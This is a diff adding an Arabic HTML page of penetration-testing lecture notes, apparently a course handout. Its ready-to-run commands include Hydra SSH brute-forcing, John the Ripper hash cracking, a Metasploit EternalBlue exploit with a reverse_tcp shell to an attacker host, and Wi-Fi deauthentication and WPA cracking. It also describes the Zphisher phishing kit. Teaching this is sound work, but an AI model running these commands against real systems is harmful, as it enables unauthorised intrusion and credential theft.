@@ -1,0 +1,971 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>محاضرات الأمن السيبراني - دليل شامل</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@300;400;500;700;900&display=swap');
+        
+        :root {
+            --primary-color: #00e676;
+            --secondary-color: #bb86fc;
+            --accent-color: #03dac6;
+            --bg-dark: #0a0a0a;
+            --bg-card: #1a1a1a;
+            --bg-hover: #2a2a2a;
+            --text-primary: #ffffff;
+            --text-secondary: #b3b3b3;
+            --text-muted: #666666;
+            --border-color: #333333;
+            --gradient-primary: linear-gradient(135deg, #00e676 0%, #03dac6 100%);
+            --gradient-secondary: linear-gradient(135deg, #bb86fc 0%, #6200ea 100%);
+            --shadow-glow: 0 0 20px rgba(0, 230, 118, 0.3);
+            --shadow-card: 0 8px 32px rgba(0, 0, 0, 0.4);
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Tajawal', sans-serif;
+            background: var(--bg-dark);
+            color: var(--text-primary);
+            line-height: 1.8;
+            overflow-x: hidden;
+        }
+        
+        /* Animated Background */
+        .bg-animation {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            background: radial-gradient(circle at 20% 50%, rgba(0, 230, 118, 0.1) 0%, transparent 50%),
+                        radial-gradient(circle at 80% 20%, rgba(187, 134, 252, 0.1) 0%, transparent 50%),
+                        radial-gradient(circle at 40% 80%, rgba(3, 218, 198, 0.1) 0%, transparent 50%);
+            animation: bgFloat 20s ease-in-out infinite;
+        }
+        
+        @keyframes bgFloat {
+            0%, 100% { transform: translateY(0px) rotate(0deg); }
+            33% { transform: translateY(-20px) rotate(1deg); }
+            66% { transform: translateY(10px) rotate(-1deg); }
+        }
+        
+        /* Header */
+        .header {
+            position: relative;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            background: linear-gradient(135deg, rgba(0, 230, 118, 0.1) 0%, rgba(187, 134, 252, 0.1) 100%);
+            overflow: hidden;
+        }
+        
+        .header::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><defs><pattern id="grid" width="10" height="10" patternUnits="userSpaceOnUse"><path d="M 10 0 L 0 0 0 10" fill="none" stroke="%23333" stroke-width="0.5"/></pattern></defs><rect width="100" height="100" fill="url(%23grid)"/></svg>');
+            opacity: 0.3;
+            animation: gridMove 30s linear infinite;
+        }
+        
+        @keyframes gridMove {
+            0% { transform: translate(0, 0); }
+            100% { transform: translate(10px, 10px); }
+        }
+        
+        .hero-content {
+            position: relative;
+            z-index: 2;
+            max-width: 800px;
+            padding: 2rem;
+        }
+        
+        .hero-title {
+            font-size: clamp(2.5rem, 5vw, 4rem);
+            font-weight: 900;
+            background: var(--gradient-primary);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            margin-bottom: 1rem;
+            animation: titleGlow 3s ease-in-out infinite alternate;
+        }
+        
+        @keyframes titleGlow {
+            0% { filter: drop-shadow(0 0 10px rgba(0, 230, 118, 0.5)); }
+            100% { filter: drop-shadow(0 0 20px rgba(0, 230, 118, 0.8)); }
+        }
+        
+        .hero-subtitle {
+            font-size: 1.5rem;
+            color: var(--text-secondary);
+            margin-bottom: 2rem;
+            animation: fadeInUp 1s ease-out 0.5s both;
+        }
+        
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        
+        .scroll-indicator {
+            position: absolute;
+            bottom: 2rem;
+            left: 50%;
+            transform: translateX(-50%);
+            animation: bounce 2s infinite;
+        }
+        
+        .scroll-arrow {
+            width: 30px;
+            height: 30px;
+            border: 2px solid var(--primary-color);
+            border-top: none;
+            border-left: none;
+            transform: rotate(45deg);
+        }
+        
+        @keyframes bounce {
+            0%, 20%, 50%, 80%, 100% { transform: translateX(-50%) translateY(0); }
+            40% { transform: translateX(-50%) translateY(-10px); }
+            60% { transform: translateX(-50%) translateY(-5px); }
+        }
+        
+        /* Navigation */
+        .nav {
+            position: sticky;
+            top: 0;
+            background: rgba(26, 26, 26, 0.95);
+            backdrop-filter: blur(20px);
+            border-bottom: 1px solid var(--border-color);
+            z-index: 1000;
+            transition: all 0.3s ease;
+        }
+        
+        .nav-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 1rem 2rem;
+        }
+        
+        .nav-list {
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+            gap: 1rem;
+            list-style: none;
+        }
+        
+        .nav-item {
+            position: relative;
+        }
+        
+        .nav-link {
+            display: block;
+            padding: 0.8rem 1.5rem;
+            color: var(--text-secondary);
+            text-decoration: none;
+            border-radius: 50px;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .nav-link::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: var(--gradient-primary);
+            transition: left 0.3s ease;
+            z-index: -1;
+        }
+        
+        .nav-link:hover {
+            color: var(--bg-dark);
+            transform: translateY(-2px);
+            box-shadow: var(--shadow-glow);
+        }
+        
+        .nav-link:hover::before {
+            left: 0;
+        }
+        
+        /* Main Content */
+        .main {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 2rem;
+        }
+        
+        .lecture-card {
+            background: var(--bg-card);
+            border-radius: 20px;
+            padding: 3rem;
+            margin-bottom: 3rem;
+            border: 1px solid var(--border-color);
+            box-shadow: var(--shadow-card);
+            position: relative;
+            overflow: hidden;
+            transition: all 0.3s ease;
+        }
+        
+        .lecture-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 4px;
+            background: var(--gradient-primary);
+        }
+        
+        .lecture-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3), var(--shadow-glow);
+        }
+        
+        .lecture-title {
+            font-size: 2.5rem;
+            font-weight: 700;
+            color: var(--primary-color);
+            margin-bottom: 1.5rem;
+            position: relative;
+        }
+        
+        .lecture-title::after {
+            content: '';
+            position: absolute;
+            bottom: -10px;
+            right: 0;
+            width: 60px;
+            height: 3px;
+            background: var(--gradient-secondary);
+            border-radius: 2px;
+        }
+        
+        .section-title {
+            font-size: 1.8rem;
+            font-weight: 600;
+            color: var(--secondary-color);
+            margin: 2rem 0 1rem 0;
+            position: relative;
+            padding-right: 1rem;
+        }
+        
+        .section-title::before {
+            content: '▶';
+            position: absolute;
+            right: -0.5rem;
+            color: var(--accent-color);
+            font-size: 0.8em;
+        }
+        
+        .content-text {
+            font-size: 1.1rem;
+            line-height: 1.8;
+            color: var(--text-secondary);
+            margin-bottom: 1.5rem;
+        }
+        
+        .feature-list {
+            list-style: none;
+            margin: 1.5rem 0;
+        }
+        
+        .feature-item {
+            padding: 0.8rem 0;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+            position: relative;
+            padding-right: 2rem;
+            transition: all 0.3s ease;
+        }
+        
+        .feature-item::before {
+            content: '✓';
+            position: absolute;
+            right: 0;
+            top: 50%;
+            transform: translateY(-50%);
+            color: var(--primary-color);
+            font-weight: bold;
+            font-size: 1.2em;
+        }
+        
+        .feature-item:hover {
+            color: var(--text-primary);
+            padding-right: 2.5rem;
+        }
+        
+        .code-block {
+            background: #0d1117;
+            border: 1px solid #30363d;
+            border-radius: 10px;
+            padding: 1.5rem;
+            margin: 1.5rem 0;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9rem;
+            color: #f0f6fc;
+            overflow-x: auto;
+            position: relative;
+        }
+        
+        .code-block::before {
+            content: 'CODE';
+            position: absolute;
+            top: 0.5rem;
+            left: 1rem;
+            font-size: 0.7rem;
+            color: var(--accent-color);
+            font-weight: bold;
+        }
+        
+        .warning-box {
+            background: linear-gradient(135deg, rgba(255, 193, 7, 0.1) 0%, rgba(255, 152, 0, 0.1) 100%);
+            border: 1px solid rgba(255, 193, 7, 0.3);
+            border-radius: 15px;
+            padding: 1.5rem;
+            margin: 2rem 0;
+            position: relative;
+        }
+        
+        .warning-box::before {
+            content: '⚠️';
+            position: absolute;
+            top: 1rem;
+            right: 1rem;
+            font-size: 1.5rem;
+        }
+        
+        .warning-title {
+            font-weight: 700;
+            color: #ffc107;
+            margin-bottom: 0.5rem;
+        }
+        
+        .info-box {
+            background: linear-gradient(135deg, rgba(3, 218, 198, 0.1) 0%, rgba(0, 230, 118, 0.1) 100%);
+            border: 1px solid rgba(3, 218, 198, 0.3);
+            border-radius: 15px;
+            padding: 1.5rem;
+            margin: 2rem 0;
+            position: relative;
+        }
+        
+        .info-box::before {
+            content: '💡';
+            position: absolute;
+            top: 1rem;
+            right: 1rem;
+            font-size: 1.5rem;
+        }
+        
+        .info-title {
+            font-weight: 700;
+            color: var(--accent-color);
+            margin-bottom: 0.5rem;
+        }
+        
+        /* Responsive Design */
+        @media (max-width: 768px) {
+            .nav-list {
+                flex-direction: column;
+                align-items: center;
+            }
+            
+            .lecture-card {
+                padding: 2rem;
+                margin-bottom: 2rem;
+            }
+            
+            .lecture-title {
+                font-size: 2rem;
+            }
+            
+            .main {
+                padding: 1rem;
+            }
+        }
+        
+        /* Smooth Scrolling */
+        html {
+            scroll-behavior: smooth;
+        }
+        
+        /* Loading Animation */
+        .loading {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: var(--bg-dark);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            opacity: 1;
+            transition: opacity 0.5s ease;
+        }
+        
+        .loading.hidden {
+            opacity: 0;
+            pointer-events: none;
+        }
+        
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 3px solid var(--border-color);
+            border-top: 3px solid var(--primary-color);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <!-- Loading Screen -->
+    <div class="loading" id="loading">
+        <div class="spinner"></div>
+    </div>
+    
+    <!-- Animated Background -->
+    <div class="bg-animation"></div>
+    
+    <!-- Header -->
+    <header class="header">
+        <div class="hero-content">
+            <h1 class="hero-title">محاضرات الأمن السيبراني</h1>
+            <p class="hero-subtitle">دليل شامل ومفصل لأدوات وتقنيات الأمن السيبراني</p>
+        </div>
+        <div class="scroll-indicator">
+            <div class="scroll-arrow"></div>
+        </div>
+    </header>
+    
+    <!-- Navigation -->
+    <nav class="nav">
+        <div class="nav-container">
+            <ul class="nav-list">
+                <li class="nav-item"><a href="#lec2" class="nav-link">جمع المعلومات</a></li>
+                <li class="nav-item"><a href="#lec3" class="nav-link">فحص الشبكات</a></li>
+                <li class="nav-item"><a href="#lec4" class="nav-link">كسر كلمات المرور</a></li>
+                <li class="nav-item"><a href="#lec5" class="nav-link">Metasploit</a></li>
+                <li class="nav-item"><a href="#lec6" class="nav-link">أساسيات الأمن</a></li>
+                <li class="nav-item"><a href="#lec7" class="nav-link">الشبكات اللاسلكية</a></li>
+                <li class="nav-item"><a href="#lec8" class="nav-link">الهندسة الاجتماعية</a></li>
+            </ul>
+        </div>
+    </nav>
+    
+    <!-- Main Content -->
+    <main class="main">
+        <!-- Lecture 2: Information Gathering -->
+        <section id="lec2" class="lecture-card">
+            <h2 class="lecture-title">المحاضرة الثانية: جمع المعلومات</h2>
+            <p class="content-text">تعتبر مرحلة جمع المعلومات حجر الزاوية في أي عملية اختبار اختراق. كلما زادت المعلومات التي تجمعها عن الهدف، زادت فرص نجاحك في العثور على ثغرات أمنية. تنقسم هذه المرحلة إلى جمع المعلومات السلبي (لا يوجد تفاعل مباشر مع الهدف) والنشط (تفاعل مباشر).</p>
+            
+            <h3 class="section-title">أدوات جمع المعلومات الأساسية</h3>
+            <ul class="feature-list">
+                <li class="feature-item"><strong>Whois:</strong> أداة للاستعلام عن معلومات تسجيل أسماء النطاقات، مثل المالك وجهة التسجيل وتواريخ الإنشاء والانتهاء</li>
+                <li class="feature-item"><strong>nslookup & dig:</strong> أدوات للاستعلام عن سجلات DNS الخاصة بالنطاق، مثل عنوان IP وسجلات البريد</li>
+                <li class="feature-item"><strong>theHarvester:</strong> أداة قوية تجمع البريد الإلكتروني وأسماء الموظفين والنطاقات الفرعية من مصادر عامة</li>
+                <li class="feature-item"><strong>Recon-ng:</strong> إطار عمل متكامل لجمع المعلومات يشبه Metasploit</li>
+                <li class="feature-item"><strong>Maltego:</strong> أداة رسومية قوية لتحليل الروابط وجمع المعلومات من مصادر مفتوحة</li>
+            </ul>
+            
+            <h3 class="section-title">مثال عملي باستخدام theHarvester</h3>
+            <div class="code-block">
+                theharvester -d example.com -l 500 -b google
+            </div>
+            <p class="content-text">هذا الأمر يبحث في Google عن أول 500 نتيجة متعلقة بالنطاق example.com ويستخرج أي معلومات متاحة.</p>
+        </section>
+        
+        <!-- Lecture 3: Network Scanning -->
+        <section id="lec3" class="lecture-card">
+            <h2 class="lecture-title">المحاضرة الثالثة: فحص الشبكات واكتشاف الثغرات</h2>
+            <p class="content-text">تعتبر أدوات فحص الشبكات ضرورية لاكتشاف الأجهزة المضيفة والمنافذ المفتوحة والخدمات وأنظمة التشغيل، مما يساعد في تحديد نقاط الضعف المحتملة.</p>
+            
+            <h3 class="section-title">1. Nmap (Network Mapper)</h3>
+            <p class="content-text">Nmap هي أداة مفتوحة المصدر قوية ومتعددة الاستخدامات تُستخدم لاكتشاف الشبكات وفحص المنافذ وتدقيق الأمن. تُعتبر الأداة الأساسية لأي مختبر اختراق.</p>
+            
+            <h4 class="section-title">استخدامات Nmap الشائعة:</h4>
+            <ul class="feature-list">
+                <li class="feature-item">مسح Ping (-sn): لاكتشاف الأجهزة المضيفة النشطة في الشبكة</li>
+                <li class="feature-item">مسح المنافذ (افتراضي): يقوم بمسح 1000 منفذ الأكثر شيوعاً</li>
+                <li class="feature-item">مسح منافذ محددة (-p): لمسح منافذ معينة فقط</li>
+                <li class="feature-item">اكتشاف نظام التشغيل (-O): لتخمين نظام التشغيل المستهدف</li>
+                <li class="feature-item">اكتشاف إصدار الخدمة (-sV): لتحديد إصدارات الخدمات</li>
+            </ul>
+            
+            <div class="code-block">
+                # مسح الأجهزة النشطة
+                nmap -sn 192.168.1.0/24
+                
+                # مسح شامل
+                nmap -A 192.168.1.1
+                
+                # مسح SYN الخفي
+                nmap -sS 192.168.1.1
+            </div>
+            
+            <h3 class="section-title">2. Netdiscover</h3>
+            <p class="content-text">Netdiscover هي أداة سريعة لاكتشاف الشبكة تعتمد على بروتوكول ARP، ممتازة لتحديد الأجهزة المضيفة النشطة في الشبكة المحلية.</p>
+            
+            <div class="code-block">
+                # المسح التلقائي
+                sudo netdiscover
+                
+                # مسح في نطاق محدد
+                sudo netdiscover -r 192.168.1.0/24
+                
+                # الوضع السلبي
+                sudo netdiscover -p
+            </div>
+            
+            <h3 class="section-title">3. Enum4linux</h3>
+            <p class="content-text">Enum4linux هي أداة لينكس تُستخدم لجمع المعلومات من أنظمة Windows عبر بروتوكول SMB. تُستخدم بشكل شائع في اختبارات الاختراق لعد المستخدمين والمجموعات والمجلدات المشتركة.</p>
+            
+            <h3 class="section-title">4. snmpwalk</h3>
+            <p class="content-text">snmpwalk هي أداة سطر أوامر تُستخدم للاستعلام واسترداد المعلومات من الأجهزة باستخدام بروتوكول SNMP. تقوم بـ "المشي" عبر جزء من شجرة MIB للحصول على بيانات منظمة من جهاز بعيد.</p>
+            
+            <div class="code-block">
+                # الصيغة الأساسية
+                snmpwalk -v 2c -c public 192.168.1.1
+                
+                # معرفات الكائنات المفيدة
+                # وصف النظام: 1.3.6.1.2.1.1.1.0
+                # معلومات الاتصال: 1.3.6.1.2.1.1.4.0
+                # العمليات الجارية: 1.3.6.1.2.1.25.4.2.1.2
+            </div>
+        </section>
+        
+        <!-- Lecture 4: Password Attacks -->
+        <section id="lec4" class="lecture-card">
+            <h2 class="lecture-title">المحاضرة الرابعة: أدوات الهجوم على كلمات المرور</h2>
+            <p class="content-text">تُعد أدوات الهجوم على كلمات المرور جزءاً أساسياً من اختبار الاختراق، حيث تهدف إلى اكتشاف كلمات المرور الضعيفة أو المخترقة في الأنظمة والخدمات المختلفة.</p>
+            
+            <h3 class="section-title">1. Hydra - أداة الهجوم عبر الإنترنت</h3>
+            <p class="content-text">تُعتبر Hydra من أقوى الأدوات في مجال اختبار الاختراق، وتُستخدم على نطاق واسع في عملية اختبار قوة كلمات المرور على مختلف الخدمات والبروتوكولات الشبكية.</p>
+            
+            <h4 class="section-title">البروتوكولات المدعومة:</h4>
+            <ul class="feature-list">
+                <li class="feature-item">SSH (Secure Shell): لتسجيل الدخول عن بعد</li>
+                <li class="feature-item">FTP (File Transfer Protocol): لنقل الملفات</li>
+                <li class="feature-item">HTTP/HTTPS: للمصادقة على صفحات الويب</li>
+                <li class="feature-item">Telnet: للوصول عن بعد إلى الأجهزة</li>
+                <li class="feature-item">RDP: للتحكم عن بعد في أجهزة الكمبيوتر</li>
+                <li class="feature-item">MySQL, PostgreSQL: لقواعد البيانات</li>
+            </ul>
+            
+            <h4 class="section-title">مثال عملي: اختبار أمان خادم SSH</h4>
+            <div class="code-block">
+                # هجوم قاموس على SSH
+                hydra -l root -P passwords.txt ssh://192.168.1.100
+                
+                # هجوم بقائمة مستخدمين وكلمات مرور
+                hydra -L users.txt -P passwords.txt ssh://192.168.1.100
+                
+                # تحديد عدد الخيوط المتوازية
+                hydra -l admin -P rockyou.txt -t 4 ssh://192.168.1.100
+            </div>
+            
+            <h3 class="section-title">2. John the Ripper - أداة الهجوم دون اتصال</h3>
+            <p class="content-text">John the Ripper هي أداة قوية لاختراق كلمات المرور دون اتصال بالإنترنت. تُستخدم بشكل أساسي لاكتشاف كلمات المرور الضعيفة في أنظمة التشغيل المختلفة.</p>
+            
+            <h4 class="section-title">أنواع الهجمات:</h4>
+            <ul class="feature-list">
+                <li class="feature-item">هجوم القاموس: تجرب كلمات مرور من قائمة معدة مسبقاً</li>
+                <li class="feature-item">هجوم القوة الغاشمة: تجرب جميع التركيبات الممكنة</li>
+                <li class="feature-item">هجوم القواعد: تطبق قواعد معينة على كلمات القاموس</li>
+            </ul>
+            
+            <div class="code-block">
+                # تثبيت John the Ripper
+                sudo apt install john
+                
+                # فك تشفير ملف محمي بكلمة مرور
+                python3 office2john.py document.xlsx > hash.txt
+                john --wordlist=rockyou.txt hash.txt
+                
+                # عرض كلمات المرور المكتشفة
+                john --show hash.txt
+            </div>
+            
+            <div class="warning-box">
+                <div class="warning-title">نصيحة أمنية</div>
+                <p>استخدام كلمات مرور قوية وفريدة لكل حساب يقلل بشكل كبير من خطر نجاح هجمات القاموس والقوة الغاشمة. كما أن تفعيل المصادقة الثنائية (2FA) يضيف طبقة حماية إضافية.</p>
+            </div>
+        </section>
+        
+        <!-- Lecture 5: Metasploit -->
+        <section id="lec5" class="lecture-card">
+            <h2 class="lecture-title">المحاضرة الخامسة: إطار عمل Metasploit</h2>
+            <p class="content-text">Metasploit Framework هو إطار عمل مفتوح المصدر لاختبار الاختراق، يُستخدم لتطوير واختبار وتنفيذ الاستغلالات ضد الأنظمة الضعيفة. إنه مجموعة شاملة من الأدوات التي تسمح للمستخدمين باستغلال الثغرات الأمنية بطريقة منظمة وفعالة.</p>
+            
+            <h3 class="section-title">المكونات الرئيسية</h3>
+            <ul class="feature-list">
+                <li class="feature-item"><strong>الاستغلالات (Exploits):</strong> وحدات برمجية مصممة للاستفادة من ثغرة أمنية محددة</li>
+                <li class="feature-item"><strong>الحمولات (Payloads):</strong> الكود الذي يتم تنفيذه على النظام المستهدف بعد نجاح الاستغلال</li>
+                <li class="feature-item"><strong>الوحدات المساعدة (Auxiliary):</strong> أدوات تساعد في جمع المعلومات أو مهام أخرى</li>
+                <li class="feature-item"><strong>المشفرات (Encoders):</strong> تُستخدم لتشفير الحمولات لتجنب الاكتشاف</li>
+            </ul>
+            
+            <h3 class="section-title">أقسام واجهة Metasploit</h3>
+            <ul class="feature-list">
+                <li class="feature-item"><strong>RECON (أزرق):</strong> للاستطلاع وجمع المعلومات قبل الاستغلال</li>
+                <li class="feature-item"><strong>EXPLOIT (أخضر):</strong> لاستغلال الثغرات باستخدام وحدات الاستغلال المتاحة</li>
+                <li class="feature-item"><strong>PAYLOAD (أحمر):</strong> الكود الضار الذي يتم حقنه في الهدف</li>
+                <li class="feature-item"><strong>LOOT (أصفر):</strong> البيانات التي تم جمعها بعد الاستغلال</li>
+            </ul>
+            
+            <h3 class="section-title">مثال عملي: استغلال MS17-010 (EternalBlue)</h3>
+            <p class="content-text">هذا المثال يوضح كيفية استغلال ثغرة EternalBlue الشهيرة التي كانت مسؤولة عن هجوم WannaCry.</p>
+            
+            <div class="code-block">
+                # تشغيل Metasploit
+                msfconsole
+                
+                # البحث عن الاستغلال
+                search ms17_010
+                
+                # اختيار الاستغلال
+                use exploit/windows/smb/ms17_010_eternalblue
+                
+                # عرض الخيارات
+                show options
+                
+                # تعيين IP الهدف
+                set RHOSTS 192.168.20.206
+                
+                # تعيين الحمولة
+                set PAYLOAD windows/x64/meterpreter/reverse_tcp
+                
+                # تعيين IP المهاجم
+                set LHOST 192.168.20.248
+                
+                # تشغيل الاستغلال
+                exploit
+            </div>
+            
+            <div class="warning-box">
+                <div class="warning-title">ملاحظة هامة</div>
+                <p>ثغرة EternalBlue خطيرة جداً، وهذا المثال لأغراض تعليمية فقط ويجب استخدامه في بيئات معملية خاضعة للتحكم.</p>
+            </div>
+        </section>
+        
+        <!-- Lecture 6: Information Security Basics -->
+        <section id="lec6" class="lecture-card">
+            <h2 class="lecture-title">المحاضرة السادسة: أساسيات أمن المعلومات</h2>
+            <p class="content-text">أمن المعلومات هو حماية المعلومات وأنظمة المعلومات من الوصول غير المصرح به والاستخدام والكشف والتعديل والتدمير أو التعطيل. يرتكز أمن المعلومات على ثلاثة مبادئ أساسية تُعرف باسم مثلث CIA.</p>
+            
+            <h3 class="section-title">مثلث CIA</h3>
+            <ul class="feature-list">
+                <li class="feature-item"><strong>السرية (Confidentiality):</strong> ضمان أن المعلومات لا يمكن الوصول إليها إلا من قبل الأشخاص المصرح لهم</li>
+                <li class="feature-item"><strong>التكامل (Integrity):</strong> ضمان دقة واكتمال المعلومات وطرق معالجتها ومنع التعديل غير المصرح به</li>
+                <li class="feature-item"><strong>التوفر (Availability):</strong> ضمان أن المستخدمين المصرح لهم يمكنهم الوصول إلى المعلومات والأنظمة عند الحاجة</li>
+            </ul>
+            
+            <h3 class="section-title">أنواع الضوابط الأمنية</h3>
+            <ul class="feature-list">
+                <li class="feature-item"><strong>الضوابط الإدارية:</strong> السياسات والإجراءات التي تحكم سلوك المستخدمين والموظفين</li>
+                <li class="feature-item"><strong>الضوابط التقنية:</strong> استخدام التكنولوجيا لحماية المعلومات مثل جدران الحماية والتشفير</li>
+                <li class="feature-item"><strong>الضوابط المادية:</strong> الإجراءات المادية لحماية الأصول مثل الأقفال والكاميرات</li>
+            </ul>
+            
+            <h3 class="section-title">تصنيفات الحماية حسب الوظيفة</h3>
+            <ul class="feature-list">
+                <li class="feature-item"><strong>الضوابط الوقائية:</strong> تهدف إلى منع وقوع الهجمات</li>
+                <li class="feature-item"><strong>الضوابط الكشفية:</strong> تهدف إلى اكتشاف الهجمات فور وقوعها</li>
+                <li class="feature-item"><strong>الضوابط التصحيحية:</strong> تهدف إلى استعادة الأنظمة بعد وقوع الهجوم</li>
+            </ul>
+            
+            <div class="info-box">
+                <div class="info-title">نصيحة أمنية</div>
+                <p>فهم مبادئ أمن المعلومات وتطبيق الضوابط الأمنية المناسبة هو حجر الزاوية في بناء بيئة رقمية آمنة. الأمان الفعال يتطلب نهجاً متعدد الطبقات يجمع بين الضوابط الإدارية والتقنية والمادية.</p>
+            </div>
+        </section>
+        
+        <!-- Lecture 7: Wireless Network Penetration -->
+        <section id="lec7" class="lecture-card">
+            <h2 class="lecture-title">المحاضرة السابعة: أدوات اختراق الشبكات اللاسلكية</h2>
+            <p class="content-text">تُستخدم أدوات اختراق الشبكات اللاسلكية لتقييم أمان الشبكات اللاسلكية واكتشاف الثغرات فيها. هذه الأدوات تساعد في أتمتة وتسريع عملية اكتشاف الثغرات وتُستخدم من قبل خبراء الأمن لتقييم نقاط الضعف.</p>
+            
+            <h3 class="section-title">الأدوات الرئيسية</h3>
+            <ul class="feature-list">
+                <li class="feature-item">Aircrack-ng: مجموعة شاملة من الأدوات لتقييم أمان شبكات Wi-Fi</li>
+                <li class="feature-item">Wireshark: محلل بروتوكولات الشبكة</li>
+                <li class="feature-item">Kismet: أداة اكتشاف وتحليل الشبكات اللاسلكية</li>
+                <li class="feature-item">Reaver: أداة متخصصة في استغلال ثغرة WPS</li>
+                <li class="feature-item">Wifite: سكريبت مؤتمت لتبسيط هجمات Wi-Fi</li>
+                <li class="feature-item">Wifiphisher: أداة التصيد الاحتيالي للشبكات اللاسلكية</li>
+            </ul>
+            
+            <h3 class="section-title">1. Aircrack-ng</h3>
+            <p class="content-text">Aircrack-ng هي مجموعة متكاملة من الأدوات مفتوحة المصدر تُستخدم لتقييم أمان شبكات Wi-Fi. تُعتبر من الأدوات الأساسية في مجال اختبار الاختراق الأخلاقي للشبكات اللاسلكية.</p>
+            
+            <h4 class="section-title">مكونات Aircrack-ng الرئيسية:</h4>
+            <ul class="feature-list">
+                <li class="feature-item"><strong>airmon-ng:</strong> تفعيل وتعطيل وضع المراقبة على بطاقة الشبكة اللاسلكية</li>
+                <li class="feature-item"><strong>airodump-ng:</strong> مسح الشبكات اللاسلكية وجمع المعلومات والتقاط المصافحة</li>
+                <li class="feature-item"><strong>aireplay-ng:</strong> حقن الحزم وتنفيذ هجمات قطع الاتصال</li>
+                <li class="feature-item"><strong>aircrack-ng:</strong> كسر مفاتيح التشفير WEP/WPA/WPA2</li>
+            </ul>
+            
+            <div class="code-block">
+                # تفعيل وضع المراقبة
+                sudo airmon-ng start wlan0
+                
+                # مسح الشبكات والتقاط البيانات
+                sudo airodump-ng --bssid [BSSID] -c [CHANNEL] -w [FILENAME] wlan0mon
+                
+                # هجوم قطع الاتصال
+                sudo aireplay-ng --deauth 0 -a [BSSID] -c [CLIENT_MAC] wlan0mon
+                
+                # كسر كلمة المرور
+                aircrack-ng -w [WORDLIST] -b [BSSID] [FILENAME].cap
+            </div>
+            
+            <h3 class="section-title">2. Wireshark</h3>
+            <p class="content-text">Wireshark هو محلل بروتوكولات شبكة يُعتبر المعيار الذهبي في هذا المجال. يسمح بالتقاط حركة المرور على الشبكة وعرضها بتفاصيل دقيقة وسهلة القراءة.</p>
+            
+            <h3 class="section-title">3. Kismet</h3>
+            <p class="content-text">Kismet هي أداة قوية ومتقدمة تُستخدم لاكتشاف وتحليل الشبكات اللاسلكية وتحديد التهديدات الأمنية. تتفوق في الاستطلاع السلبي وتعمل دون إرسال أي حزم.</p>
+            
+            <h4 class="section-title">مميزات Kismet:</h4>
+            <ul class="feature-list">
+                <li class="feature-item">المسح السلبي: تستمع فقط دون إرسال حزم</li>
+                <li class="feature-item">اكتشاف الشبكات المخفية (Hidden SSIDs)</li>
+                <li class="feature-item">هندسة العميل/الخادم مع واجهة ويب حديثة</li>
+                <li class="feature-item">دعم مصادر متعددة (Wi-Fi, Bluetooth, SDR)</li>
+                <li class="feature-item">تحديد الموقع الجغرافي مع GPS</li>
+                <li class="feature-item">نظام تنبيهات متقدم لاكتشاف التسلل</li>
+            </ul>
+            
+            <div class="warning-box">
+                <div class="warning-title">ملاحظة هامة</div>
+                <p>جميع هذه الأدوات يجب استخدامها فقط في بيئات مخبرية أو على شبكات تملك الإذن الصريح لاختبارها. الاستخدام غير المصرح به لهذه الأدوات قد يكون غير قانوني ويمكن أن يؤدي إلى عواقب قانونية خطيرة.</p>
+            </div>
+        </section>
+        
+        <!-- Lecture 8: Social Engineering -->
+        <section id="lec8" class="lecture-card">
+            <h2 class="lecture-title">المحاضرة الثامنة: الهندسة الاجتماعية</h2>
+            <p class="content-text">تُعد الهندسة الاجتماعية من أبرز الأساليب المستخدمة في مجال أمن المعلومات، حيث تعتمد على الخداع البشري والتلاعب النفسي بدلاً من الاعتماد المباشر على الثغرات التقنية.</p>
+            
+            <h3 class="section-title">أدوات الهندسة الاجتماعية الشائعة</h3>
+            <p class="content-text">تتضمن أدوات الهندسة الاجتماعية منصات مخصصة لتصميم هجمات التصيد الاحتيالي أو انتحال الهوية. هذه الأدوات لا تعتمد على تخمين كلمة المرور، بل على خداع المستخدمين وجعلهم يسلمون كلمة المرور بأنفسهم.</p>
+            
+            <h3 class="section-title">1. Zphisher</h3>
+            <p class="content-text">Zphisher هي أداة مفتوحة المصدر مطورة لتسهيل هجمات التصيد الاحتيالي. توفر أكثر من 30 قالباً جاهزاً لخدمات شهيرة مثل Facebook وInstagram وGmail وNetflix وPayPal وصفحات تسجيل الدخول لشبكات Wi-Fi.</p>
+            
+            <h4 class="section-title">مميزات Zphisher:</h4>
+            <ul class="feature-list">
+                <li class="feature-item">سهولة التشغيل على Kali وUbuntu وTermux</li>
+                <li class="feature-item">توفر قوالب جاهزة لصفحات تسجيل الدخول</li>
+                <li class="feature-item">تدعم Port Forwarding عبر Ngrok وServeo وLocalHostRun</li>
+                <li class="feature-item">تحفظ المدخلات في ملفات Logs داخل الأداة</li>
+            </ul>
